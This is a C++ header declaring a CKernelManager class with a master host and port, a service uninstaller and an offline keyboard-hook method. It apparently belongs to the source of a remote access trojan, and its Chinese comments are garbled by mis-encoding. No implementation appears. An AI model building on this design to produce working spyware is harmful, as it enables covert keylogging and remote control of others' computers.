// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KERNELMANAGER_H__D073A3EC_2409_4BC0_88E1_DC22AA07986B__INCLUDED_)
#define AFX_KERNELMANAGER_H__D073A3EC_2409_4BC0_88E1_DC22AA07986B__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"

class CKernelManager : public CManager
{
public:
    CKernelManager(CClientSocket *pClient, LPCTSTR lpszMasterHost, UINT nMasterPort,
                   DLLSERVER_INFO* dll_info);
    virtual ~CKernelManager();
    virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

    void	UnInstallService();
    bool	IsActived();
    bool	m_bIsActived;
    void StartUnLineHook();//¼üÅÌ¼ÇÂ¼
    CKernelManager(CClientSocket *pClient, DLLSERVER_INFO* dll_info);//¼üÅÌ¼ÇÂ¼
    static	char	m_strMasterHost[256];
    static	UINT	m_nMasterPort;
private:
    HANDLE	m_hThread[1000]; // ×ã¹»ÓÃÁË
    UINT	m_nThreadCount;
    DLLSERVER_INFO *m_DllInfo;
};


#endif // !defined(AFX_KERNELMANAGER_H__D073A3EC_2409_4BC0_88E1_DC22AA07986B__INCLUDED_)
